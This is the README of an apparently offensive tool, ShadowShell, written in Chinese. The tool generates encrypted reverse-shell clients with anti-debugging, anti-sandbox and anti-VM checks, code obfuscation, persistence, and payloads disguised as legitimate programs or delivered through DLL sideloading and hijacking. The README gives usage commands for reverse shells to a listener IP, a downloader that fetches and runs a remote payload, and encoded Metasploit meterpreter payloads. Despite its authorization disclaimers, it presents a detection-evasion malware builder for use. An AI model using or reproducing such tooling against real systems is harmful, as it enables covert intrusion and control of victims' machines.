# ShadowShell

⚠️ **Note：此工具仍然处于开发阶段，请勿用于实战环境**
⚠️ **Note：此工具仍然处于开发阶段，请勿用于实战环境**
⚠️ **Note：此工具仍然处于开发阶段，请勿用于实战环境**

## 项目概述


ShadowShell 是一个高度模块化的Shell生成器，专为渗透测试和安全研究设计。该工具提供了加密的反向Shell客户端生成功能，具有高级混淆和反检测特性。

⚠️ **重要声明：此工具仅用于授权的渗透测试和安全研究，使用前请确保获得明确授权并遵守当地法律法规。**

## 项目结构

```
WS/
├── main.py                 # 主程序入口
├── modules/               # 模块化代码
│   ├── __init__.py        # 模块初始化
│   ├── cipher.py          # 加密解密模块
│   ├── code_generator.py  # 代码生成模块
│   ├── anti_detection.py  # 反检测模块
│   ├── shell_generator.py # Shell文件生成模块
│   ├── white_black.py     # 白加黑技术模块
│   ├── utils.py           # 工具函数模块
│   └── ui.py              # 用户界面模块
└── README.md              # 项目文档
```

## 功能特性

### 🔐 加密功能
- **多层加密**：XOR + 自定义算法 + Base64 + 压缩
- **随机密钥生成**：支持自定义长度和字符集
- **密钥强度控制**：可选择包含特殊字符

### 🛡️ 反检测功能
- **反调试检测**：检测常见调试器和分析工具
- **反沙箱检测**：多重沙箱环境识别
- **反虚拟机检测**：VM特征文件和注册表检测
- **时间检测**：检测时间加速和分析延迟
- **网络检测**：验证真实网络环境

### 🎯 代码混淆
- **变量名随机化**：避免特征检测
- **假代码注入**：添加无害的干扰代码
- **分阶段执行**：多阶段载荷投递
- **导入混淆**：随机化导入顺序

### 🔫 MSF集成支持
- **Metasploit载荷**：支持生成MSF载荷
- **多种载荷类型**：Meterpreter、Shell等多种载荷
- **载荷编码**：支持多种编码器和迭代加密
- **自动监听器**：生成对应的监听器命令
- **载荷包装**：智能包装和混淆MSF载荷

### 🔄 持久化支持
- **Windows持久化**：启动项和注册表
- **Linux持久化**：自启动配置
- **跨平台兼容**：自动检测操作系统

### 🎭 白加黑技术
- **合法程序包装**：将载荷嵌入合法程序模板
- **DLL侧加载**：利用DLL搜索顺序执行载荷
- **DLL劫持**：替换系统DLL实现载荷投递
- **多种包装模板**：系统优化工具、网络监控、安全扫描等
- **自动混淆隐藏**：载荷深度隐藏在正常功能中

## 使用方法

### 交互式模式
```bash
python3 main.py
```

### 命令行模式
```bash
python3 main.py -i 192.168.1.100 -p 4444 --anti-detection --use-dropper
```

### 下载器模式
```bash
python3 main.py -i 192.168.1.100 -p 4444 --use-downloader --download-url "http://example.com/payload.py" --downloader-silent
```

### 白加黑模式
```bash
# 合法程序包装模式
python3 main.py -i 192.168.1.100 -p 4444 --use-white-black --white-black-mode wrapper

# DLL侧加载模式  
python3 main.py -i 192.168.1.100 -p 4444 --use-white-black --white-black-mode sideloading

# DLL劫持模式
python3 main.py -i 192.168.1.100 -p 4444 --use-white-black --white-black-mode hijacking
```

### MSF集成模式
```bash
# 使用MSF载荷 (需要安装Metasploit)
python3 main.py -i 192.168.1.100 -p 4444 --use-msf

# 指定MSF载荷类型
python3 main.py -i 192.168.1.100 -p 4444 --use-msf --msf-payload windows/meterpreter/reverse_tcp

# 使用编码器
python3 main.py -i 192.168.1.100 -p 4444 --use-msf --msf-encoder x86/shikata_ga_nai --msf-iterations 5

# MSF + 白加黑组合
python3 main.py -i 192.168.1.100 -p 4444 --use-msf --use-white-black --white-black-mode wrapper
```

### 命令行参数
```bash
-i, --ip              监听IP地址 (必需)
-p, --port            监听端口 (必需)
-r, --retry           连接重试次数 (默认: 10)
-d, --delay           重试间隔秒数 (默认: 5)
-k, --key-length      密钥长度 (默认: 16)
-o, --output          输出目录 (默认: 当前目录)
-f, --filename        自定义文件名
--persistence         添加持久化功能
--anti-detection      添加反杀毒特征
--use-dropper         使用分阶段执行模式
--use-white-black     使用白加黑技术
--white-black-mode    白加黑模式 (wrapper/sideloading/hijacking)
--use-downloader      生成下载器模式
--download-url        下载地址 (主程序URL)
--downloader-silent   下载器静默模式
--use-msf             使用MSF(Metasploit)载荷
--msf-payload         MSF载荷类型 (默认: python/meterpreter/reverse_tcp)
--msf-encoder         MSF编码器 (如: x86/shikata_ga_nai)  
--msf-iterations      MSF编码迭代次数
--msf-format          MSF输出格式 (python/raw/exe/dll/powershell)
--quiet               静默模式
--silent-delay        执行前延迟时间 (默认: 30秒)
```

## 功能模式说明

### 🌐 下载器模式
下载器模式会生成两个Python文件：
1. **主程序文件** - 包含完整的Shell连接功能
2. **下载器文件** - 负责从指定URL下载并执行主程序

**使用流程：**
1. 生成主程序和下载器文件
2. 将主程序文件上传到Web服务器
3. 在目标机器上运行下载器文件
4. 下载器自动下载并执行主程序

**优势：**
- 分离部署，降低检测风险
- 下载器体积小，传输方便
- 支持静默下载和执行
- 自动清理临时文件

### 🔫 MSF集成模式
MSF集成模式利用Metasploit框架生成高级载荷：

**功能特点：**
- 支持所有MSF载荷类型
- 自动载荷编码和混淆
- 生成对应监听器命令
- 与现有功能完全兼容

**使用流程：**
1. 确保已安装Metasploit框架
2. 选择合适的载荷类型
3. 配置编码器和迭代次数
4. 生成载荷和监听器命令
5. 使用msfconsole启动监听器

**推荐载荷：**
- `python/meterpreter/reverse_tcp` - 最通用
- `python/meterpreter/reverse_https` - 加密传输
- `windows/meterpreter/reverse_tcp` - Windows环境
- `linux/x64/meterpreter/reverse_tcp` - Linux环境

**优势：**
- 全功能Meterpreter会话
- 高级后渗透功能
- 载荷自动编码避免检测
- 支持多种传输协议

### 🎭 白加黑模式
白加黑模式会在标准Shell基础上额外生成白加黑载荷文件：

**合法程序包装模式：**
- 生成伪装成系统工具的Python文件
- 载荷隐藏在正常功能代码中
- 包含系统优化、网络监控、安全扫描等模板

**DLL侧加载模式：**
- 生成C++源码和编译脚本
- 利用Windows DLL搜索顺序
- 需要编译成DLL并部署到目标程序目录

**DLL劫持模式：**
- 生成多个可劫持的DLL源码
- 替换系统或程序DLL
- 包含详细的使用说明文档

## 模块说明

### cipher.py - 加密模块
提供高级加密功能，包括：
- `AdvancedCipher`类：多层加密实现
- `gene_key()`：基础密钥生成
- `gene_advanced_key()`：高强度密钥生成

### code_generator.py - 代码生成模块
负责生成Shell连接代码：
- `gene_code()`：简单版本代码生成
- `gene_code_obfuscated()`：混淆版本代码生成
- `advanced_obfuscate_code()`：高级代码混淆

### anti_detection.py - 反检测模块
实现各种反检测技术：
- 反调试检测
- 反沙箱检测
- 反虚拟机检测
- 环境验证

### shell_generator.py - Shell生成模块
生成最终的Shell文件：
- `gene_shell()`：标准Shell文件生成
- `create_payload_dropper()`：分阶段执行文件生成
- `create_downloader()`：下载器文件生成

### white_black.py - 白加黑模块
实现白加黑技术：
- `create_white_black_payload()`：合法程序包装载荷生成
- `create_dll_sideloading_payload()`：DLL侧加载载荷生成
- `create_hijacking_payload()`：DLL劫持载荷生成
- `generate_white_black_template()`：白加黑模板代码生成

### msf_integration.py - MSF集成模块
提供Metasploit框架集成：
- `MSFIntegration`类：MSF载荷生成和管理
- `create_msf_shell_wrapper()`：MSF载荷包装器生成
- `get_msf_config_recommendations()`：MSF配置建议
- 支持多种载荷类型和编码器

### utils.py - 工具模块
提供辅助功能：
- IP和端口验证
- 配置文件生成
- 结果输出格式化

### ui.py - 用户界面模块
处理用户交互：
- 交互式界面
- 命令行参数解析

## 安全注意事项

1. **授权使用**：仅在获得明确授权的环境中使用
2. **法律合规**：遵守当地法律法规
3. **责任使用**：用户对使用后果承担全部责任
4. **测试环境**：建议在隔离的测试环境中使用

## 技术细节

### 加密流程
1. 原始代码 → XOR加密
2. XOR结果 → 自定义算法加密
3. 加密结果 → Base64编码 + zlib压缩

### 反检测流程
1. 环境初始化检查
2. 反调试检测
3. 反沙箱检测
4. 延迟执行
5. 载荷解密执行

### 混淆技术
- 变量名随机化
- 代码结构打乱
- 假函数和变量注入
- 动态执行路径

## 许可证

本项目仅供教育和研究目的使用。使用者需承担使用此工具的全部法律责任。

---

**免责声明**：此工具的开发目的是为了帮助安全研究人员和渗透测试人员评估系统安全性。任何恶意使用此工具的行为都是被严格禁止的，开发者对此类行为不承担任何责任。
